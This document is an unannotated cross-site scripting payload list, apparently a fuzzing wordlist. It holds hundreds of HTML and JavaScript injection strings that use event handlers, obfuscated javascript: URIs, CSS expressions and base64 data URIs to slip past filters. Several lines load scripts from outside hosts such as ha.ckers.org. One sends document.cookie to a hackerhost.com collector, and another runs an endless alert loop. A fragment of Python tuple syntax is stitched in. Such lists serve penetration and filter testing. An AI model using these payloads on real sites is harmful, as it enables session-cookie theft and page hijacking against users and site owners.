<BODY ONLOAD=javascript:javascript:alert(1)>
<BODY onload!#$%%&()*~+-_.,:;?@[/|\]^`=javascript:alert(1)>
<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
<BR SIZE="&{alert('XSS')}">
<BR SIZE="&{javascript:alert(1)}">
<DIV STYLE="background-image: url( javascript:alert('XSS'))">
<DIV STYLE="background-image: url(&#1;javascript:alert('XSS'))">
<DIV STYLE="background-image: url(javascript:alert('XSS'))">
<DIV STYLE="background-image: url(javascript:javascript:alert(1))">
<DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029">
<DIV STYLE="width: expression(alert('XSS'));">
<DIV STYLE="width:expression(javascript:alert(1));">
<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>
<EMBED SRC="http://ha.ckers.org/xss.swf" AllowScriptAccess="always"></EMBED>
<EMBED SRC="http://hacker.com/xss.swf" AllowScriptAccess="always">
<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>
<FRAMESET><FRAME SRC="javascript:document.vulnerable=true;"></frameset>
<FRAMESET><FRAME SRC="javascript:javascript:alert(1);"></FRAMESET>
<FRAMESET><FRAME SRC=\"javascript:alert('XSS');\"></FRAMESET>
<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-%(payload)s;+ADw-/SCRIPT+AD4-
<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-
<HTML xmlns:xss><?import namespace="xss" implementation="%(htc)s"><xss:xss>XSS</xss:xss></HTML>""","XML namespace."),("""<XML ID="xss"><I><B>&lt;IMG SRC="javas<!-- -->cript:javascript:alert(1)"&gt;</B></I></XML><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>
<HTML xmlns:xss><?import namespace="xss" implementation="http://www.securitycompass.com/xss.htc"><xss:xss>XSS</xss:xss</html>
<HTML xmlns:xss><?import namespace="xss" implementation="http://www.securitycompass.com/xss.htc"><xss:xss>XSS</xss:xss></html>
<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS&lt;SCRIPT DEFER&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;"></BODY></HTML>
<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS&lt;SCRIPT DEFER&gt;javascript:alert(1)&lt;/SCRIPT&gt;"></BODY></HTML>
<IFRAME SRC=”http://hacker-site.com/xss.html”>
<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
<IFRAME SRC="javascript:document.vulnerable=true;"></iframe>
<IFRAME SRC="javascript:javascript:alert(1);"></IFRAME>
<IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>
<IFRAME width="420" height="315" frameborder="0" onload="alert(document.cookie)"></IFRAME>
<IMG “””><SCRIPT>alert(“XSS”)</SCRIPT>”>
<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
<IMG DYNSRC="javascript:alert('XSS')">
<IMG DYNSRC="javascript:javascript:alert(1)">
<IMG DYNSRC=\"javascript:alert('XSS')\">
<IMG LOWSRC="javascript:alert('XSS')">
<IMG LOWSRC="javascript:javascript:alert(1)">
<IMG LOWSRC=\"javascript:alert('XSS')\">
<IMG SRC=”jav ascript:alert(‘XSS’);”>
<IMG SRC=”jav&#x09;ascript:alert(‘XSS’);”>
<IMG SRC=”javascript:alert(‘XSS’)”
<IMG SRC=”javascript:alert(‘XSS’);”>
<IMG SRC= onmouseover="alert('xxs')">
<IMG SRC="  javascript:alert('XSS');">
<IMG SRC=" &#14;  javascript:alert('XSS');">
<IMG SRC="http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode">
<IMG SRC="jav    ascript:alert('XSS');">
<IMG SRC="jav    ascript:javascript:alert(1);">
<IMG SRC="jav ascript:alert('XSS');">
<IMG SRC="jav ascript:javascript:alert(1);">
<IMG SRC="jav&#x09;ascript:alert('XSS');">
<IMG SRC="jav&#x0A;ascript:alert('XSS');">
<IMG SRC="jav&#x0A;ascript:alert(<WBR>'XSS');">
<IMG SRC="jav&#x0D;ascript:alert('XSS');">
<IMG SRC="jav&#x0D;ascript:alert(<WBR>'XSS');">
<IMG SRC="javascript:alert('XSS')"
<IMG SRC="javascript:alert('XSS');">
<IMG SRC="javascript:javascript:alert(1)"
<IMG SRC="javascript:javascript:alert(1);">
<IMG SRC="livescript:[code]">
<IMG SRC=# onmouseover="alert('xxs')">
<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
<IMG SRC=&{javascript:alert(1);};>
<IMG SRC='vbscript:msgbox("XSS")'>
<IMG SRC='vbscript:msgbox(\"XSS\")'>
<IMG SRC=JaVaScRiPt:alert(&quot;XSS<WBR>&quot;)>
<IMG SRC=JaVaScRiPt:alert('XSS')>
<IMG SRC=\"jav&#x09;ascript:alert('XSS');\">
<IMG SRC=\"jav&#x0A;ascript:alert('XSS');\">
<IMG SRC=\"jav&#x0D;ascript:alert('XSS');\">
<IMG SRC=`javascript:alert("RSnake says, 'XSS'")`>
<IMG SRC=`javascript:javascript:alert(1)`>
<IMG SRC=jAVasCrIPt:alert(‘XSS’)>
<IMG SRC=javascript:alert(‘XSS’)>      
<IMG SRC=javascript:alert("XSS")>
<IMG SRC=javascript:alert(&quot;XSS&quot;)>
<IMG SRC=javascript:alert('XSS')>
<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
<IMG SRC=javascript:javascript:alert(1)>
<IMG SRC=javascrscriptipt:alert('XSS')>
<IMG SRC=x onabort="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onbeforeprint="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onbeforeunload="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onblur="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x oncanplay="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x oncanplaythrough="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onchange="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onclick="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x oncontextmenu="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x oncopy="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x oncuechange="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x oncut="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x ondblclick="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x ondrag="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x ondragend="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x ondragenter="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x ondragleave="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x ondragover="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x ondragstart="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x ondrop="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x ondurationchange="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onemptied="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onended="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onerror="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onhashchange="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x oninput="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x oninvalid="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onkeydown="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onkeypress="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onkeyup="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onload="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onloadeddata="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onloadedmetadata="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onloadstart="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onmessage="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onmousedown="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onmousemove="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onmouseout="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onmouseover="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onmouseup="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onmousewheel="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onoffline="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x ononline="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onpagehide="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onpageshow="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onpaste="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onpause="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onplay="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onplaying="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onpopstate="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onprogress="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onratechange="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onreset="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onresize="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onscroll="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onsearch="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onseeked="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onseeking="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onselect="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onshow="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onstalled="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onstorage="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onsubmit="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onsuspend="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x ontimeupdate="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x ontoggle="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onunload="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onvolumechange="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onwaiting="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onwheel="alert(String.fromCharCode(88,83,83))">
<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
<IMG STYLE="xss:expr/*XSS*/ession(javascript:alert(1))">
<IMG onmouseover="alert('xxs')">
<IMGSRC=&#0000106&#0000097&<WBR>#0000118&#0000097&#0000115&<WBR>#0000099&#0000114&#0000105&<WBR>#0000112&#0000116&#0000058&<WBR>#0000097&#0000108&#0000101&<WBR>#0000114&#0000116&#0000040&<WBR>#0000039&#0000088&#0000083&<WBR>#0000083&#0000039&#0000041>
<IMGSRC=&#106;&#97;&#118;&#97;&<WBR>#115;&#99;&#114;&#105;&#112;&<WBR>#116;&#58;&#97;&#108;&#101;&<WBR>#114;&#116;&#40;&#39;&#88;&#83<WBR>;&#83;&#39;&#41>
<IMGSRC=&#x6A&#x61&#x76&#x61&#x73&<WBR>#x63&#x72&#x69&#x70&#x74&#x3A&<WBR>#x61&#x6C&#x65&#x72&#x74&#x28&<WBR>#x27&#x58&#x53&#x53&#x27&#x29>
<INPUT TYPE=”IMAGE” SRC=”javascript:alert(‘XSS’);”>
<INPUT TYPE="BUTTON" action="alert('XSS')"/>
<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
<INPUT TYPE="IMAGE" SRC="javascript:javascript:alert(1);">
<LAYER SRC="%(scriptlet)s"></LAYER>
<LAYER SRC="javascript:document.vulnerable=true;"></LAYER>
<LINK REL="stylesheet" HREF="http://ha.ckers.org/xss.css">
<LINK REL="stylesheet" HREF="javascript:alert('XSS');">
<LINK REL="stylesheet" HREF="javascript:javascript:alert(1);">
<META HTTP-EQUIV="Link" Content="<%(css)s>; REL=stylesheet">
<META HTTP-EQUIV="Link" Content="<http://ha.ckers.org/xss.css>; REL=stylesheet">
<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert('XSS')</SCRIPT>">
<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');">
<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:javascript:alert(1);">
<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:javascript:alert(1);">
<META HTTP-EQUIV=\"refresh\" CONTENT=\"0; URL=http://;URL=javascript:alert('XSS');\">
<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript:alert('XSS');\">
<META onpaonpageonpagonpageonpageshowshoweshowshowgeshow="alert(1)";
<OBJECT CLASSID="clsid:333C7BC4-460F-11D0-BC04-0080C7055A83"><PARAM NAME="DataURL" VALUE="javascript:alert(1)"></OBJECT>
<OBJECT TYPE="text/x-scriptlet" DATA="%(scriptlet)s"></OBJECT>
<OBJECT TYPE="text/x-scriptlet" DATA="http://ha.ckers.org/scriptlet.html"></OBJECT>
<OBJECT TYPE="text/x-scriptlet" DATA="http://hacker.com/xss.html">
<OBJECT TYPE="text/x-scriptlet" DATA="http://www.securitycompass.com/scriptlet.html"></object>
<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:document.vulnerable=true></object>
<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:javascript:alert(1)></OBJECT>
<P STYLE="behavior:url('#default#time2')" end="0" onEnd="javascript:alert(1)">
<SCRIPT "a='>'" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT =">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT FOR=document EVENT=onreadystatechange>javascript:alert(1)</SCRIPT>
<SCRIPT SRC="%(jpg)s"></SCRIPT>
<SCRIPT SRC="http://ha.ckers.org/xss.jpg"></SCRIPT>
<SCRIPT SRC=%(jscript)s?<B>
<SCRIPT SRC=//ha.ckers.org/.j>
<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>
<SCRIPT SRC=http://ha.ckers.org/xss.js?< B >
<SCRIPT SRC=http://hacker-site.com/xss.js></SCRIPT>
<SCRIPT a=">" '' SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT a=">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT a=">'>" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT a=`>` SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT onreadystatechange=javascript:javascript:alert(1);></SCRIPT>
<SCRIPT/SRC="%(jscript)s"></SCRIPT>
<SCRIPT/SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT> alert(“XSS”); </SCRIPT>
<SCRIPT>Document.write('<img src=\'http://hackerhost.com/getcookie.php?cookie='+escape(document.cookie)+'\' height=1 width=1>');</SCRIPT>
<SCRIPT>String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41)</SCRIPT>
<SCRIPT>a=/XSS/alert(a.source)</SCRIPT>
<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT>document.write("XSS");</SCRIPT>
<STYLE TYPE="text/javascript">alert('XSS');</STYLE>
<STYLE TYPE="text/javascript">javascript:alert(1);</STYLE>
<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
<STYLE type="text/css">BODY{background:url("javascript:javascript:alert(1)")}</STYLE>
<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>
<STYLE>.XSS{background-image:url("javascript:javascript:alert(1)");}</STYLE><A CLASS=XSS></A>
<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
<STYLE>@import'%(css)s';</STYLE>
<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>
<STYLE>BODY{-moz-binding:url("http://ha.ckers.org/xssmoz.xml#xss")}</STYLE>
<STYLE>a{background:url('s1' 's2)}@import javascript:javascript:alert(1);');}</STYLE>
<STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS</br>
<STYLE>li {list-style-image: url("javascript:javascript:alert(1)");}</STYLE><UL><LI>XSS
<STYLE>li {list-style-image: url(\"javascript:alert('XSS')\");}</STYLE><UL><LI>XSS
<ScRiPt%20>prompt(document.domain)</ScRiPt>
<ScRiPt>alert(1)</sCriPt>
<ScRipT 5-0*3+9/3=>prompt(1)</ScRipT giveanswerhere=?
<ScRipT>alert("XSS");</ScRipT>
<ScRipt>ALeRt("hi");</sCRipT>
<TABLE BACKGROUND="javascript:alert('XSS')">
<TABLE BACKGROUND="javascript:javascript:alert(1)">
<TABLE><TD BACKGROUND="javascript:alert('XSS')">
<TABLE><TD BACKGROUND="javascript:javascript:alert(1)">
<TD BACKGROUND="javascript:alert('XSS')">
<XML ID="xss"><I><B><IMG SRC="javas<!-- -->cript:document.vulnerable=true"></B></I></XML><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></span>
<XML ID=I><X><C><![<IMG SRC="javas]]<![cript:document.vulnerable=true;">]]</C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></span>
<XML ID=I><X><C><![CDATA[<IMG SRC="javas]]<![CDATA[cript:javascript:alert(1);">]]</C><X></xml>
<XSS STYLE="behavior: url(%(htc)s);">
<XSS STYLE="behavior: url(xss.htc);">
<XSS STYLE="xss:expression(alert('XSS'))">
<XSS STYLE="xss:expression(document.vulnerable=true)">
<XSS STYLE="xss:expression(javascript:alert(1))">
<XSS STYLE=xss:e/**/xpression(alert('XSS'))>
<XSS/*-*/STYLE=xss:e/**/xpression(alert('XSS'))>
<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe
<a href=“?xss=<script>”>link</a>
<a href=”data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+”>ClickMe
<a href="\x00javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x01javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x02javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x03javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x04javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x05javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x06javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x07javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x08javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x09javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x0Ajavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x0Bjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x0Cjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x0Djavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x0Ejavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x0Fjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x10javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x11javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x12javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x13javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x14javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x15javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x16javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x17javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x18javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x19javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x1Ajavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x1Bjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x1Cjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x1Djavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x1Ejavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x1Fjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x20javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xC2\xA0javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE1\x9A\x80javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE1\xA0\x8Ejavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x80javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x81javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x82javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x83javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x84javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x85javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x86javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x87javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x88javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x89javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x8Ajavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\xA8javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\xA9javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\xAFjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x81\x9Fjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE3\x80\x80javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="about:<script>document.vulnerable=true;</script>">
<a href="data:application/x-x509-user-cert;&NewLine;base64&NewLine;,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==" >X</a
<a href="data:application/x-x509-user-cert;&NewLine;base64&NewLine;,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="&#09;&#10;&#11;>X</a
<a href="data:text/html;base64_,<svg/onload=\u0061&#x6C;&#101%72t(1)>">X</a
<a href="data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203">Click Me</a>
<a href="jAvAsCrIpT&colon;alert&lpar;1&rpar;">X</a>
<a href="jav&#65ascript:javascript:alert(1)">test1</a>
<a href="jav&#97ascript:javascript:alert(1)">test1</a>
<a href="javas\x00cript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x01cript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x02cript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x03cript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x04cript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x05cript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x06cript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x07cript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x08cript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x09cript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x0Acript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x0Bcript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x0Ccript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x0Dcript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javascript#document.vulnerable=true;">
<a href="javascript&colon;\u0061&#x6C;&#101%72t&lpar;1&rpar;"><button>
<a href="javascript:javascript:alert(1)"><event-source src="data:application/x-dom-event-stream,Event:click%0Adata:XXX%0A%0A">
<a href="javascript:void(0)" onmouseover=&NewLine;javascript:alert(1)&NewLine;>X</a>
<a href="javascript\x00:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javascript\x09:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javascript\x0A:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javascript\x0D:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javascript\x3A:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javascript\x3Ajavascript:alert(1)" id="fuzzelement1">test</a>
<a href=[�]"� onmouseover=prompt(1)//">XYZ</a
<a href=http://foo.bar/#x=`y></a><img alt="`><img src=x:x onerror=javascript:alert(1)></a>">
<a href=java&#1&#2&#3&#4&#5&#6&#7&#8&#11&#12script:javascript:alert(1)>XXX</a>
<a href=javascript&colon;alert&lpar;document&period;cookie&rpar;>Click Here</a>
<a onmouseover="alert(document.cookie)">xxs link</a>
<a onmouseover=alert(document.cookie)>xxs link</a>
<a style="-o-link:'javascript:javascript:alert(1)';-o-link-source:current">X
<a style="behavior:url(#default#AnchorClick);" folder="javascript:javascript:alert(1)">XXX</a>
<a style="pointer-events:none;position:absolute;"><a style="position:absolute;" onclick="javascript:alert(1);">XXX</a></a><a href="javascript:javascript:alert(1)">XXX</a>
<a&#32;href&#61;&#91;&#00;&#93;"&#00; onmouseover=prompt&#40;1&#41;&#47;&#47;">XYZ</a
<a/href="javascript: javascript:prompt(1)"><input type="X">
<a/href="javascript:&#13; javascript:prompt(1)"><input type="X">
<applet onError applet onError="javascript:javascript:alert(1)"></applet onError>
<applet onReadyStateChange applet onReadyStateChange="javascript:javascript:alert(1)"></applet onReadyStateChange>
<applet onerror applet onerror="javascript:javascript:alert(1)"></applet onerror>
<applet onreadystatechange applet onreadystatechange="javascript:javascript:alert(1)"></applet onreadystatechange>
<audio src=1 href=1 onerror="javascript:alert(1)"></audio>
<audio src=1 onerror=alert(1)>
<b "<script>alert(1)</script>">hola</b>
<b <script>alert(1)</script>0
<b/alt="1"onmouseover=InputBox+1language=vbs>test</b>
<base HREF="javascript:document.vulnerable=true;//">
<bgsound SRC="javascript:document.vulnerable=true;">
<bgsound onPropertyChange bgsound onPropertyChange="javascript:javascript:alert(1)"></bgsound onPropertyChange>
<bgsound src="javascript:document.vulnerable=true;">
<blink/ onmouseover=pr&#x6F;mpt(1)>OnMouseOver {Firefox & Opera}
<body BACKGROUND="javascript:document.vulnerable=true;">
<body ONLOAD=document.vulnerable=true;>
<body background=javascript:'"><script>alert(navigator.userAgent)</script>></body>
<body onBeforeUnload body onBeforeUnload="javascript:javascript:alert(1)"></body onBeforeUnload>
<body onFocus body onFocus="javascript:javascript:alert(1)"></body onFocus>
<body onLoad body onLoad="javascript:javascript:alert(1)"></body onLoad>
<body onLoad="alert('XSS');"
<body onLoad="while(true) alert('XSS');">
<body onMouseEnter body onMouseEnter="javascript:javascript:alert(1)"></body onMouseEnter>
<body onMouseMove body onMouseMove="javascript:javascript:alert(1)"></body onMouseMove>
<body onMouseOver body onMouseOver="javascript:javascript:alert(1)"></body onMouseOver>
